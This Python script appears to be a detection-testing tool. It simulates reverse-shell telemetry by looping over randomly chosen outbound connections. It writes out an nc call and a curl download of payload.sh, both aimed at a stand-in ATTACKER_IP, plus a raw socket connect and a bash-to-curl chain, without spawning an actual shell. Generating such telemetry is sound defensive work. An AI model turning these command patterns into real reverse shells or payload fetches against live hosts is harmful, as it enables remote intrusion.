#!/usr/bin/env python3
"""Attack: Reverse shell simulation — attempts outbound connections typical of reverse shells.
NOTE: Does NOT actually establish a real reverse shell. Simulates the OS-level behavior."""
import subprocess, time, random, socket, os

ATTACKER_IP = os.environ.get("ATTACKER_IP", "127.0.0.1")
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", "4444"))

def attempt_bash_revshell():
    """Simulate bash reverse shell pattern: bash spawning network connection."""
    try:
        # This will fail (no listener) but creates the telemetry signature
        subprocess.run(
            ["bash", "-c", f"echo test | nc -w 2 {ATTACKER_IP} {ATTACKER_PORT} 2>/dev/null || true"],
            capture_output=True, timeout=5
        )
    except Exception:
        pass

def attempt_python_revshell():
    """Simulate python reverse shell connect pattern."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.close()
    except Exception:
        pass

def attempt_curl_download():
    """Simulate downloading a payload — common in attack chains."""
    try:
        subprocess.run(
            ["curl", "-s", "-o", "/dev/null", f"http://{ATTACKER_IP}:{ATTACKER_PORT}/payload.sh"],
            capture_output=True, timeout=5
        )
    except Exception:
        pass

def suspicious_bash_chain():
    """bash → curl → bash pattern (highly suspicious)."""
    try:
        subprocess.run(["bash", "-c", "curl -s http://example.com > /dev/null"], capture_output=True, timeout=5)
        subprocess.run(["bash", "-c", "echo 'simulated payload execution'"], capture_output=True, timeout=5)
    except Exception:
        pass

ATTACKS = [attempt_bash_revshell, attempt_python_revshell, attempt_curl_download, suspicious_bash_chain]

def run():
    print("[Attack] Reverse shell simulation started")
    while True:
        attack = random.choice(ATTACKS)
        attack()
        time.sleep(random.uniform(60, 300))

if __name__ == "__main__":
    run()
